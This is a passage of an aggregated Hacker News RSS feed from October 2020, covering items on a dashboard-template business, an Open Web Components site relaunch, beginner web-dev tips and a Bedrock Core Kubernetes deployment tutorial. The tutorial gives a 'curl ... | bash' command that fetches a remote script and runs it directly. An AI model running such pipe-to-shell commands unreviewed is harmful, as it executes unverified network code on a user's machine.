<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://heartbeat.fritz.ai/introduction-to-graph-neural-networks-c5a9f4aa9e99">https://heartbeat.fritz.ai/introduction-to-graph-neural-networks-c5a9f4aa9e99</a></em></p>]]>
            </description>
            <link>https://heartbeat.fritz.ai/introduction-to-graph-neural-networks-c5a9f4aa9e99</link>
            <guid isPermaLink="false">hacker-news-small-sites-24930676</guid>
            <pubDate>Thu, 29 Oct 2020 14:19:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The digital world has become primary ‚Äì the physical world is now just the mirror]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24930323">thread link</a>) | @lawschool333
<br/>
October 29, 2020 | https://www.pairagraph.com/dialogue/5e569e6fbc944e998c79502820c3b0c9/1?2 | <a href="https://web.archive.org/web/*/https://www.pairagraph.com/dialogue/5e569e6fbc944e998c79502820c3b0c9/1?2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.pairagraph.com/dialogue/5e569e6fbc944e998c79502820c3b0c9/1?2</link>
            <guid isPermaLink="false">hacker-news-small-sites-24930323</guid>
            <pubDate>Thu, 29 Oct 2020 13:38:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I built a dashboard template and sold it for $90k]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24930252">thread link</a>) | @pixelcave
<br/>
October 29, 2020 | https://pixelcave.com/blog/how-i-built-a-dashboard-template-and-sold-it-for-90000-usd | <a href="https://web.archive.org/web/*/https://pixelcave.com/blog/how-i-built-a-dashboard-template-and-sold-it-for-90000-usd">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-content">
                        <p>I bought my first PC back in 1998 and started experimenting with web design a few years later. It was amazing how easily you could create web pages with rich content and navigate between them just like in interactive desktop apps. Let‚Äôs not talk about all those texture backgrounds along with animated gifs that no one could resist using. It was a playground and I loved it.</p>

<p>Microsoft Frontpage and Macromedia Dreamweaver (which was later acquired by Adobe) were the first tools I used to design and code websites just for the fun of it. At first, it was a more ‚Äòwhat you see is what you get‚Äô (WYSIWYG) approach but soon, I started playing more directly with HTML and CSS through Dreamweaver‚Äôs code editor.</p>

<p>A passion was born with various fun web projects being built on the side. I loved that aspect and while I was studying for my bachelor‚Äôs degree in Informatics, I got involved with all the web projects I could find. Those included web development and helped me improve my skills in those areas as well.</p>

<p>The idea that I might be able to work online from my home quickly became an obsession back then. In 2009, demand for web applications was rising, so I started experimenting with dashboard templates and eventually, 3 projects were created and released in the next 3 years.</p>

<p>I built them in my free time while I was working with a tech company on a few web apps and studying for my master‚Äôs degree at the same time. They did just ok but a whole new world was opened in front of me.</p>

<p>Unfortunately, due to the various responsibilities I had at the time, I kept postponing any further action but I eventually did a dynamic comeback in 2013 when I was ready to put all my energy into designing and coding dashboard templates full-time.</p>

<h3>Passionate with UI design</h3>

<p>You‚Äôve heard before that you need to love your work if you would like to be successful but that‚Äôs only half the story. Loving what you do can motivate you, inspire you and make things a bit easier but that‚Äôs not necessarily enough in the long run.</p>

<p>I was and I am extremely passionate with UI design and coding. Back then, I used Photoshop to design each project and afterwards, I did my best to code it into HTML/CSS and make sure it works great in each major desktop and mobile browser. I used to spend so many hours testing and making sure that the result would be as perfect as possible based on my skills.</p>

<p>In 2013, I was able to build and release 3 more projects which were built with love and care. That‚Äôs also when the mottos ‚ÄúCrafted with love‚Äù and ‚ÄúHappy coding‚Äù came to life and follow pixelcave since then. The templates did good but unfortunately it was nothing sustainable.</p>

<p>I loved what I was doing and felt really good designing and coding but that on its own wasn‚Äôt enough. I needed to start thinking differently because if the whole plan didn‚Äôt work out, pixelcave most probably wouldn‚Äôt exist today.</p>

<h3>What people need</h3>

<p>I knew that I needed to deliver value to the people using those projects and save them time, so I had to do a far better job researching their needs before even start creating the next project, <a href="https://pixelcave.com/products/proui">ProUI</a>. It might seem obvious now but wasn‚Äôt the case back then.</p>

<p>I went through all the feedback (emails and comments) I had received from the first 3 projects and kept putting together a list of all the things people liked, struggled with, or wish they had. A few things on the list kept coming back, so I knew that those were crucial, and I had to prioritize them.</p>

<p>Next up, I researched public feedback regarding similar projects and got a feeling of what didn‚Äôt work and the problems most of the people were having when using such products. There were many issues that also kept coming back, so I‚Äôve already had a good list of features and solutions that I had to work on ProUI.</p>

<p>What kept me researching for a while was the feeling that creating another project in the same way, would give me the same mediocre results. You can‚Äôt expect to have a different outcome when doing the same things repeatedly. I‚Äôm glad I‚Äôve followed that path before getting my hands dirty and start coding the new template.</p>

<h3>Deliver under pressure</h3>

<p>This project was everything back then because its success or failure would completely change my life. If it didn‚Äôt work, it was the end of my working from home career and I had to completely change my approach and start looking for alternatives. There was no money or time to waste and for my mind, it was a matter of survival, I wanted it to succeed so much.</p>

<p>That was the perfect timing and the pressure helped me take it very seriously. I tried to be positive and passionate about the result and kept working day and night towards making a great product. It‚Äôs funny how pressure can help or harm your work. I have experienced both outcomes in the past but thankfully it was one of the things that pushed me forward, helped me overcome my fears and boosted my creativity. ProUI was live and the pressure had delivered. Sales started coming in, a new world appeared in front of my eyes and I knew that nothing was going to be the same again.</p>

<h3>Be original</h3>

<p>ProUI was designed and coded from scratch by hand. In contrary to the way other products were created by only using readymade layouts, navigation elements and other major building blocks, ProUI foundation was based on a solid structure built exclusively for it. I think that‚Äôs what gave it an identity in the first place and helped it in the long run.</p>

<p>I did my best to implement many popular features, provide solutions to issues people were experiencing, make a template that is straightforward, easy to use and most importantly that works as advertised. When inspiration hit, personal design touches were applied to make the design original and give it the feeling of a fresh experience.</p>

<h3>Test everything like crazy</h3>

<p>Testing was one of the main features of ProUI and continue being for all current projects. It might be simpler now with most popular browsers being chromium-based but that wasn‚Äôt the case back in the days. Internet Explorer 8 was the baseline and the newly introduced popularity of mobile browsers with their own set of issues wasn‚Äôt making things any better.</p>

<p>Responsive design was in its glory days and started becoming mainstream back in 2013 but testing tools weren‚Äôt on par yet. I still remembered resizing the browser like 1000 times each day to ensure that all content would appear as supposed to from mobile screens up to desktop monitors.</p>

<p>Testing on devices was also a big issue because I only had access to 2 older smartphones. New devices kept releasing at the time with various browsers popping up, so my solution was to visit stores for testing on their promo devices! I uploaded versions of the work-in-progress template to the demo server and tested it against various devices, from Macbooks to iPhones, iPads, and latest Android devices.</p>

<p>One of the main issues people were experiencing at the time was the poor mobile performance, so I was determined to make ProUI as fast and responsive as possible. During my visits, I kept notes and tried to fix the bugs when I got back home on the fly hoping that they will work. Of course, that wasn‚Äôt always the case, so visiting the stores became part of my weekly work schedule! I switched stores occasionally, so it doesn‚Äôt get too awkward...</p>

<p>Thankfully, the effort fulfilled its purpose and ProUI was released in a good stable state. I kept visiting the stores for a few months though (before I was able to get my hands on my own testing devices) to handle any reported bugs. My goal was to always reply in less than 24hrs during business days to support requests (something that I still do), so there were days of me rushing through stores to handle the situation. I tried to keep it cool with my responses despite the store situation (how professional is to test against demo devices in a store?) but in the end, I want to believe that the effort and care I gave, really paid off and helped ProUI be as bug free as possible.</p>

<h3>Balance time and delivery</h3>

<p>I learned that you must keep a balance between the features you want to implement in your project and the time it takes you to do it. It‚Äôs far better to integrate less and put your project out there sooner than trying to make it as complete as possible.</p>

<p>While building ProUI, bills kept coming in, which in the end I think helped me because I had to put it out there as quickly as possible. That might not made it the perfect release I might had in my mind but in the end, ProUI provided value and helped people in their projects.</p>

<h3>Not knowing stuff</h3>

<p>This is important and seems to apply in everything I do. As you learn more about your product‚Äôs market or about the tech you are using, it gets harder and harder to put something out there. You analyze everything way too much and easily spot the things that might go, or you do wrong.</p>

<p>There was this guy, who started selling WordPress plugins without knowing much about the market but focused on creating great products. After managing to reach 1 million in sales, he stated that if he knew the things he discovered afterwards, he would probably have never started selling WordPress plugins in the first place because it would be too difficult for him.</p>

<p>It was early days, and this is how I felt when I was building ProUI. It was liberating not analyzing what works and what doesn‚Äôt and focus on the product itself. Since then, I try to keep a balance between the things I discover and the things I want to experiment with when working on something. It‚Äôs exactly like the designer who redesigns his website and before he even finishes, he already finds the new design awful. Don‚Äôt be like that, try to fight back!</p>

<h3>Being perfect is subjective</h3>

<p>I would describe myself as perfectionist, but I try not to. Thankfully, the characterization does not apply, most of the time. When you are aiming for perfection, the only one you satisfy is yourself. You set the bar of perfection based on the ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pixelcave.com/blog/how-i-built-a-dashboard-template-and-sold-it-for-90000-usd">https://pixelcave.com/blog/how-i-built-a-dashboard-template-and-sold-it-for-90000-usd</a></em></p>]]>
            </description>
            <link>https://pixelcave.com/blog/how-i-built-a-dashboard-template-and-sold-it-for-90000-usd</link>
            <guid isPermaLink="false">hacker-news-small-sites-24930252</guid>
            <pubDate>Thu, 29 Oct 2020 13:31:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The all-new Open Web Components (new site, and setup)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24930209">thread link</a>) | @d4kmor
<br/>
October 29, 2020 | https://open-wc.org/blog/the-all-new-open-web-components/ | <a href="https://web.archive.org/web/*/https://open-wc.org/blog/the-all-new-open-web-components/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content-wrapper"><div><main><img src="https://open-wc.org/blog/the-all-new-open-web-components/images/blog-header.jpg" alt=""><p>It has been an incredibly busy year for Open Web Components. A lot has happened behind the scenes and there is still more to come.</p><p>Let's talk about the obvious first.</p><h2 id="the-all-new-open-web-components-website"><a href="#the-all-new-open-web-components-website"></a>The all-new Open Web Components website</h2><p>As you may have noticed we completely restructured all our content. There is now a clear distinction between Guides and Documentation.</p><p>In <a href="https://open-wc.org/guides/">Guides</a> we focus more on step by step explanations while <a href="https://open-wc.org/docs/">Documentation</a> is meant as a reference book where you can look up all available options and configuration.</p><p>In Guides you can find some of our most popular pages like <a href="https://open-wc.org/guides/developing-components/codelabs/">Codelabs</a>, <a href="https://open-wc.org/guides/developing-components/code-examples/">Code Examples</a> or <a href="https://open-wc.org/guides/developing-components/publishing/">Publishing</a>. However we also added a complete new <a href="https://open-wc.org/guides/community/getting-started/">Community</a> section which showcases web component communities you can join and different Base Libraries and Component Libraries you should check out.</p><p>We also made the FAQ pages more prominent in a new knowledge section. There we share things like how <a href="https://open-wc.org/guides/knowledge/attributes-and-properties/">attributes and properties</a> or <a href="https://open-wc.org/guides/knowledge/events/">events</a> work.</p><p>Technically the new website is built using <a href="https://open-wc.org/blog/the-all-new-open-web-components/11ty.dev">eleventy</a>, <a href="https://rollupjs.org/">rollup</a>, and our own tools like Web Dev Server, Rollup HTML plugin, and MDJS. We use a service worker that caches the static HTML pages.</p><h2 id="cleaned-up-our-repo"><a href="#cleaned-up-our-repo"></a>Cleaned up our repo</h2><p>Over the last years, we have created different projects and recommendations. During this time certain projects have become deprecated as we moved on to different tools or approaches.</p><p>This doesn't mean that we've completely dropped support for these projects. While we don't feature them on the main website, we still maintain and support these projects. We don't develop any new features or functionalities, but we will continue to support bugfixes and in some cases update along with the dependent tooling.</p><p>The documentation for our legacy projects is maintained in the GitHub readmes:</p><h3 id="legacy-projects"><a href="#legacy-projects"></a>Legacy projects</h3><ul><li><a href="https://github.com/open-wc/es-dev-server">es-dev-server</a>: we rebranded it as <a href="https://modern-web.dev/docs/dev-server/overview/">web-dev-server</a></li><li><a href="https://github.com/open-wc/legacy/tree/master/packages/testing-karma">testing-karma</a> &amp; <a href="https://github.com/open-wc/legacy/tree/master/packages/karma-esm">karma-esm</a>: we now recommend <a href="https://modern-web.dev/docs/test-runner/overview/">web-test-runner</a></li><li><a href="https://github.com/open-wc/legacy/tree/master/packages/testing-karma-bs">testing-karma-bs</a>: we now recommend <a href="https://modern-web.dev/docs/test-runner/overview/">web-test-runner</a> &amp; <a href="https://modern-web.dev/docs/test-runner/browser-launchers/browserstack/">@web/test-runner-browserstack</a></li><li><a href="https://github.com/open-wc/legacy/tree/master/packages/rollup-plugin-index-html">rollup-plugin-index-html</a>: we now recommend <code>@web/rollup-plugin-html</code></li><li><a href="https://github.com/open-wc/legacy/tree/master/packages/webpack-import-meta-loader">webpack-import-meta-loader</a>: we now recommend <a href="https://www.npmjs.com/package/babel-plugin-bundled-import-meta">babel-plugin-bundled-import-meta</a></li><li><a href="https://github.com/open-wc/legacy/tree/master/packages/building-webpack">building-webpack</a>: we now recommend rollup over webpack</li><li><a href="https://github.com/open-wc/legacy/tree/master/packages/webpack-index-html-plugin">webpack-index-html-plugin</a>: we now recommend rollup over webpack</li><li><a href="https://github.com/open-wc/legacy/tree/master/packages/storybook-addon-web-components-knobs">storybook-addon-web-components-knobs</a>: storybook v6 has a new better knobs system</li></ul><p>We also moved out our <a href="https://github.com/open-wc/create">create</a> Generators into a dedicated repository - which is only our first step as we will later automate updating it's dependencies via a bot so you can always be sure you get the latest versions.</p><p>As we <a href="https://github.com/open-wc/open-wc/issues/1681">announced before</a>, we have moved some generic tools and recommendations to our new <a href="http://modern-web.dev/">Modern Web</a> project.</p><h2 id="change-our-setup"><a href="#change-our-setup"></a>Change our setup</h2><p>On top of moving out all "dusty" code, we changed the setup of our repository.</p><p>We are now using <a href="https://github.com/atlassian/changesets">changesets</a> to gives us more control about what gets released and how. With <a href="https://github.com/features/actions">github actions</a> we run our tests on multiple node versions (12 &amp; 14) and windows at the same time so we can make sure our tools don't break.</p><p>Additionally, our web testing is now performed by <a href="https://modern-web.dev/docs/test-runner/overview/">Web Test Runner</a> which runs web tests in all evergreen browsers within a GitHub action.</p><h2 id="return-focus-to-web-components"><a href="#return-focus-to-web-components"></a>Return focus to Web Components</h2><p>With all those general web development packages moved to <a href="https://modern-web.dev/">Modern Web</a> and all those legacy packages move out of the repo we can bring our focus back to web components.</p><p>You will see more web component specific guides and tools coming up.</p><p>One of those is our just recently released <a href="https://open-wc.org/docs/linting/eslint-plugin-lit-a11y/overview/">eslint-plugin-lit-a11y</a>. It features more than 20 rules that will help you write more accessible lit-html templates.</p><h2 id="issues-and-discussions"><a href="#issues-and-discussions"></a>Issues and discussions</h2><p>We do have a fair share of open issues which makes it sometimes hard to see/understand what are actual bugs/issues and what are feature requests or questions. Additionally, with all these packages some issues probably are not relevant anymore. We plan to clean this up in the upcoming weeks by</p><ol><li>Moving issues to the appropriate repository (if it's code got moved)</li><li>Moving feature requests into <a href="https://github.com/open-wc/open-wc/discussions">github discussions</a></li><li>This will leave only actual bugs in our <a href="https://github.com/open-wc/open-wc/issues">issue list</a> üí™</li></ol><p>We do hope this will make navigating out Github Page easier.</p><h2 id="joining-modern-web"><a href="#joining-modern-web"></a>Joining Modern Web</h2><p>This now also makes it more apparent that we are part of the <a href="https://modern-web.dev/discover/about/">Modern Web Family</a>.</p><p>So be sure to follow Modern Web on <a href="https://twitter.com/modern_web_dev">Twitter</a> and if you like what you see please consider sponsoring the project on <a href="https://opencollective.com/modern-web">Open Collective</a>.</p><p>Written with ‚ô•Ô∏è &nbsp; by the Open Web Components Core Team</p></main></div></div></div>]]>
            </description>
            <link>https://open-wc.org/blog/the-all-new-open-web-components/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24930209</guid>
            <pubDate>Thu, 29 Oct 2020 13:24:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Image of the Bulge of the Milky Way]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24930095">thread link</a>) | @colinprince
<br/>
October 29, 2020 | https://noirlab.edu/public/images/noirlab2027a/ | <a href="https://web.archive.org/web/*/https://noirlab.edu/public/images/noirlab2027a/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://noirlab.edu/public/images/noirlab2027a/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24930095</guid>
            <pubDate>Thu, 29 Oct 2020 13:11:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to be a confident, new web developer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24930080">thread link</a>) | @amontgomery19
<br/>
October 29, 2020 | https://blog.alanmontgomery.co.uk/how-to-be-a-confident-new-web-developer | <a href="https://web.archive.org/web/*/https://blog.alanmontgomery.co.uk/how-to-be-a-confident-new-web-developer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1603933334983/ghrvJSKj5.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text">
<p>This may seem really simple, but sometimes just doing it, works. A lot of the time you will hesitate when wanting to try something different in web development. For example, if you have an idea of how to implement functionality, my advice is just to do it! Try it out. If it doesn't work, try something else - it's the best way to self learn as well after you have learned the basics and fundamentals.</p>

<p>Seeking good experienced advice from a web developer who knows what they are talking about is a great way to solidify and help you understand a problem. If you're stuck on an issue and you really can't understand how to fix or implement it, then sometimes, asking a senior or more experienced web developer will benefit you. They can pass knowledge and expertise on to you which you'll never forget!</p>

<p>I find a lot of times if I've hit a problem in web development I can't solve, taking a quick 5-minute break and coming back to the code helps massively. You can clear your head in the space of 5 minutes, get a new perspective on things, and get fresh ideas. Most of the time it works and it can work for you too!</p>
<p>These are just some pointers to keep in mind when you are developing and implementing new ideas/solutions after you've learnt the fundamentals and basics.</p>
<p>Ps. I've recently started a YouTube channel for coding tutorials, would love to see you over there.
<a target="_blank" href="https://bit.ly/alanmontgomerycoding">Alan Montgomery - Coding Tutorials</a></p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.alanmontgomery.co.uk/how-to-be-a-confident-new-web-developer</link>
            <guid isPermaLink="false">hacker-news-small-sites-24930080</guid>
            <pubDate>Thu, 29 Oct 2020 13:09:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deploying a production ready Kubernetes Node+React platform in under 15 minutes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24930062">thread link</a>) | @dominiek
<br/>
October 29, 2020 | https://blog.bedrock.io/deploying-a-production-ready-kubernetes-node-react-platform-in-under-15-minutes/ | <a href="https://web.archive.org/web/*/https://blog.bedrock.io/deploying-a-production-ready-kubernetes-node-react-platform-in-under-15-minutes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.bedrock.io/content/images/size/w300/2020/10/davide-cantelli-TczSLeQmn9M-unsplash.jpg 300w,
                            https://blog.bedrock.io/content/images/size/w600/2020/10/davide-cantelli-TczSLeQmn9M-unsplash.jpg 600w,
                            https://blog.bedrock.io/content/images/size/w1000/2020/10/davide-cantelli-TczSLeQmn9M-unsplash.jpg 1000w,
                            https://blog.bedrock.io/content/images/size/w2000/2020/10/davide-cantelli-TczSLeQmn9M-unsplash.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.bedrock.io/content/images/size/w2000/2020/10/davide-cantelli-TczSLeQmn9M-unsplash.jpg" alt="Deploying a production ready Kubernetes Node+React platform in under 15 minutes">
            </figure>

            <section>
                <div>
                    <p><a href="https://github.com/bedrockio/bedrock-core">Bedrock Core</a> is an Open Source template that includes micro services, components and patterns that tie together Kubernetes, Elasticsearch, MongoDB, Node.js and React.</p><p>Bedrock Core was developed by me and several software developer friends over the past years in response to the fragmented application development landscape. It started out as a template to keep our own sanity, but over time we‚Äôve improved on this with every production deployment.</p><p>I think APIs, data and infrastructure automation are corner stones of any modern application. The components inside Bedrock Core all work together and have been meticulously chosen to reduce the friction of developing production-grade platforms.</p><p>In this article I‚Äôll show you how easy it is to create your own stack that includes full cloud ownership, DevOps automation, SysOps playbooks, JSON APIs, an API Portal, User Management and much more.</p><h3 id="generating-your-code-base">Generating Your Code Base</h3><p>To get started, run this in your Terminal to generate a new project: </p><pre><code>curl -s https://get.bedrock.io | bash
</code></pre><p>This script will prompt for your project name and intended domain:</p><figure><img src="https://blog.bedrock.io/content/images/2020/10/Screen-Shot-2020-10-21-at-12.29.20-PM.png" alt="" srcset="https://blog.bedrock.io/content/images/size/w600/2020/10/Screen-Shot-2020-10-21-at-12.29.20-PM.png 600w, https://blog.bedrock.io/content/images/size/w1000/2020/10/Screen-Shot-2020-10-21-at-12.29.20-PM.png 1000w, https://blog.bedrock.io/content/images/size/w1600/2020/10/Screen-Shot-2020-10-21-at-12.29.20-PM.png 1600w, https://blog.bedrock.io/content/images/2020/10/Screen-Shot-2020-10-21-at-12.29.20-PM.png 2062w" sizes="(min-width: 720px) 720px"></figure><p>You can let this script push to an empty Github repository or you can manually push it after the fact.</p><h3 id="your-mono-repo">Your Mono Repo</h3><p>You'll now have a mono repository that holds your entire platform:</p><ul><li><code>deployment/</code> - Kubernetes &amp; Terraform deployment automation and playbooks. This includes a full features backup system and data store deployment (Mongo, Elasticsearch, Data pipeline) for your platform.</li><li><code>services/api</code> - A Node.js API, enabled with authentication middleware, OpenAPI, Mongoose ORM and other best practices.</li><li><code>services/web</code> - A React Single Page App (SPA) that can interact with that API. Includes React Router, authentication screens, placeholder, API portal, dashboard and a repository of components and helper functions.</li><li>Documentation for all aspects of your new platform (Github markdown)</li><li>CI system</li></ul><figure><img src="https://blog.bedrock.io/content/images/2020/10/Screen-Shot-2020-10-21-at-12.31.24-PM.png" alt="" srcset="https://blog.bedrock.io/content/images/size/w600/2020/10/Screen-Shot-2020-10-21-at-12.31.24-PM.png 600w, https://blog.bedrock.io/content/images/size/w1000/2020/10/Screen-Shot-2020-10-21-at-12.31.24-PM.png 1000w, https://blog.bedrock.io/content/images/size/w1600/2020/10/Screen-Shot-2020-10-21-at-12.31.24-PM.png 1600w, https://blog.bedrock.io/content/images/2020/10/Screen-Shot-2020-10-21-at-12.31.24-PM.png 2260w" sizes="(min-width: 720px) 720px"><figcaption>Your CI system is already running using Github Actions</figcaption></figure><p>You can explore what this looks like simply by browsing the Bedrock Core repository: <a href="https://github.com/bedrockio/bedrock-core">https://github.com/bedrockio/bedrock-core</a></p><h3 id="your-first-deploy">Your First Deploy</h3><p>With a single script Bedrock Core can provision your infrastructure. All you need to do is create an empty Google Cloud project with a valid billing account. I recommend creating a new Google Cloud project for every environment (staging, production) - for security, separation and billing reasons.</p><pre><code>./deployment/scripts/provision_gcloud staging my-project-name</code></pre><p>All of this and much more is all described in the <code>deployments/README.md</code> documentation.</p><p>This script may prompt you to install G-Cloud CLI and Terraform if you haven't yet. The process can take up to a couple of minutes and will do the following:</p><ul><li>Enable the right services (e.g. Compute, Container) inside Google Cloud</li><li>Reserve IP addresses and auto-set these in the Kubernetes config files</li><li>Use Terraform to provision GCS Buckets, Disks and Kubernetes Cluster nodes</li><li>Use Docker to build and deploy all <code>services/</code></li></ul><p>Once completed, the script will show you the domains it's expecting:</p><figure><img src="https://blog.bedrock.io/content/images/2020/10/Screen-Shot-2020-10-21-at-12.35.26-PM.png" alt="" srcset="https://blog.bedrock.io/content/images/size/w600/2020/10/Screen-Shot-2020-10-21-at-12.35.26-PM.png 600w, https://blog.bedrock.io/content/images/size/w1000/2020/10/Screen-Shot-2020-10-21-at-12.35.26-PM.png 1000w, https://blog.bedrock.io/content/images/2020/10/Screen-Shot-2020-10-21-at-12.35.26-PM.png 1342w" sizes="(min-width: 720px) 720px"></figure><p>These can be changed at any time by modifying the Kubernetes configuration (e.g. <code>deployment/environments/staging/services/api-deployment.yml</code>) - More about this can be found in the SysOps playbooks.</p><figure><img src="https://blog.bedrock.io/content/images/2020/10/Screen-Shot-2020-10-21-at-12.36.13-PM.png" alt="" srcset="https://blog.bedrock.io/content/images/size/w600/2020/10/Screen-Shot-2020-10-21-at-12.36.13-PM.png 600w, https://blog.bedrock.io/content/images/size/w1000/2020/10/Screen-Shot-2020-10-21-at-12.36.13-PM.png 1000w, https://blog.bedrock.io/content/images/size/w1600/2020/10/Screen-Shot-2020-10-21-at-12.36.13-PM.png 1600w, https://blog.bedrock.io/content/images/2020/10/Screen-Shot-2020-10-21-at-12.36.13-PM.png 2260w" sizes="(min-width: 720px) 720px"><figcaption>Your Kubernetes Cluster is now running in Google Cloud</figcaption></figure><figure><img src="https://blog.bedrock.io/content/images/2020/10/Screen-Shot-2020-10-21-at-12.35.56-PM.png" alt="" srcset="https://blog.bedrock.io/content/images/size/w600/2020/10/Screen-Shot-2020-10-21-at-12.35.56-PM.png 600w, https://blog.bedrock.io/content/images/size/w1000/2020/10/Screen-Shot-2020-10-21-at-12.35.56-PM.png 1000w, https://blog.bedrock.io/content/images/size/w1600/2020/10/Screen-Shot-2020-10-21-at-12.35.56-PM.png 1600w, https://blog.bedrock.io/content/images/2020/10/Screen-Shot-2020-10-21-at-12.35.56-PM.png 2260w" sizes="(min-width: 720px) 720px"><figcaption>We highly recommend using Cloudflare to take care of DNS, SSL and CDN</figcaption></figure><p>Congratulations, your new platform is ready!</p><h3 id="running-locally">Running Locally</h3><p>So let's make some changes to our platform to get familiar with our codebase. In order to run the entire stack simply run Docker Compose your root:</p><pre><code>docker-compose up</code></pre><p>This will run MongoDB, the <code>services/api</code> and the <code>services/web</code> services. You can now access your app at <a href="http://localhost:2200/">http://localhost:2200</a>.</p><p><em>Note: You can also run your stack "naked" (without Docker) by executing <code>yarn start</code> in each service (requires MongoDB to be running locally).</em></p><p>Running the API will automatically create the needed database objects for you including the configured <code>ADMIN_EMAIL</code> and <code>ADMIN_PASSWORD</code> user. These will be displayed in the API console output.</p><p>You can now log into your dashboard where you will see the following:</p><ul><li>Example models - Shops &amp; Products - with full Create, Read, Update &amp; Delete (CRUD) functionality.</li><li>User management UI</li><li>User authentication flows (forgot password, login, logout, etc.)</li><li>API Portal - Curation-friendly powered by Github Markdown and OpenAPI</li></ul><figure><img src="https://blog.bedrock.io/content/images/2020/10/Screen-Shot-2020-10-21-at-12.32.15-PM.png" alt="" srcset="https://blog.bedrock.io/content/images/size/w600/2020/10/Screen-Shot-2020-10-21-at-12.32.15-PM.png 600w, https://blog.bedrock.io/content/images/size/w1000/2020/10/Screen-Shot-2020-10-21-at-12.32.15-PM.png 1000w, https://blog.bedrock.io/content/images/size/w1600/2020/10/Screen-Shot-2020-10-21-at-12.32.15-PM.png 1600w, https://blog.bedrock.io/content/images/2020/10/Screen-Shot-2020-10-21-at-12.32.15-PM.png 2260w" sizes="(min-width: 720px) 720px"><figcaption>Third party developers can integrate easily using your API portal.</figcaption></figure><h3 id="changing-the-ui">Changing the UI</h3><p>The code for the SPA is located in <code>services/web</code> and uses React, React Router and Semantic UI. The components communicate directly with the JSON API with simple utility functions - no complicated middleware.</p><p>Directory structure:</p><ul><li><code>src/index.html</code> - The server-side HTML that's used to load the assets and app. Used by Webpack to inject headers.</li><li><code>src/App.js</code> - The React Router that drives all SPA routing.</li><li><code>src/screens</code> - Every major screen (e.g. Products, Shops) that have routes to them.</li><li><code>src/components</code> - <a href="https://github.com/bedrockio/bedrock-core/tree/master/services/web/src/components">Various helper components</a> that can be used on top of Semantic UI.</li><li><code>src/utils</code> - <a href="https://github.com/bedrockio/bedrock-core/tree/master/services/web/src/utils">Various utility functions</a>. </li><li><code>src/assets</code> - Media files. The <code>src/assets/icon.svg</code> will automatically get converted to all the needed Favicon formats by Webpack.</li></ul><p>By default, the app uses React Semantic UI which provides theming capabilities on a large repository of components. Things such as fonts, primary colors, etc. can be easily edited by <a href="https://github.com/bedrockio/bedrock-core/tree/master/services/web#theming">changing the theme configuration</a>.</p><p>The <code>src/screens</code> components follow the information architecture set by the React Router ( <code>src/App.js</code>). So the CRUD UI for Shop/Products can be found in the following files:</p><ul><li><code>src/screens/Shop/Products.js</code> - A table view that lists products for a given Shop.</li><li><code>src/modals/EditProduct.js</code> - A Modal view that is used to Create or Update the Product object.</li></ul><p>These routes interact with the API in a standard rest structure <code>PATCH /1/products/:id</code> and <code>POST /1/products</code>. </p><p>For a full overview please see the <a href="https://github.com/bedrockio/bedrock-core/tree/master/services/web#bedrock-web">documentation</a> in <code>services/web/README.md</code>.</p><h3 id="changing-the-api">Changing the API</h3><p>The code for the JSON API that's used by the UI can be found in <code>services/api</code> and has the following directory structure:</p><ul><li><code>src/lib/utils</code> - Various helper functions</li><li><code>src/lib/__tests__</code> - Library level unit tests (Jest)</li><li><code>src/models</code> - Mongoose ORM models</li><li><code>src/v1</code> - Koa route files with Joi validators</li><li><code>src/v1/__openapi__</code> - OpenAPI documentation for each API</li><li><code>src/v1/__tests__</code> - API routes tests</li><li><code>src/app.js</code> - Main entry point into the API</li></ul><p>So making changes to the example Product model would typically involve changing the following files:</p><ul><li><code>src/models/product.js</code> - The model</li><li><code>src/v1/products.js</code> - The KOA Router with validators</li><li><code>src/v1/__tests__/products.js</code> - The unit test for the API routes</li><li><code>src/v1/__openapi__/products.json</code> - The API documentation for that route.</li></ul><h3 id="deploying-your-changes">Deploying your Changes</h3><p>Once you've made changes to any of the services, you can deploy the API using a single command:</p><pre><code>./deployment/scripts/deploy staging api
